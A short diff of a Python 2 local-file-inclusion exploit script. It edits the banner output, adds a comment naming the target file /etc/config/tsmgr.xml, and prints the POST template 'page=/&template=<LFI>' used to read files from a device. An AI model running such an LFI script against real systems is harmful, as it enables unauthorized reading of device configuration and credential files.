@@ -39,8 +39,8 @@ args 	= parser.parse_args()
 
 HST   	= args.HOST
 PRT 	= args.PORT
-xFILE 	= args.LFI
-cookie 	= 	args.COOKIE
+xFILE 	= args.LFI       #  /etc/config/tsmgr.xml
+cookie 	= args.COOKIE
 
 class Colors:
     BLUE 		= '\033[94m'
@@ -56,7 +56,9 @@ print Colors.GREEN+banner
 print Colors.BLUE+details
 
 
-print Colors.GREEN+" [*] HOST:\t"+Colors.ORANGE+HST
+
+print Colors.GREEN+"\n [*] HOST:\t"+Colors.ORANGE+"http://"+Colors.GREEN+(HST)+Colors.RED+":"+Colors.BLUE+(PRT)+Colors.ORANGE+"/"
+
 print Colors.GREEN+" [*] POST:\t"+Colors.BLUE+"page=/&template=<"+Colors.RED+" LFI "+Colors.BLUE+">"
 
 xFiles = [
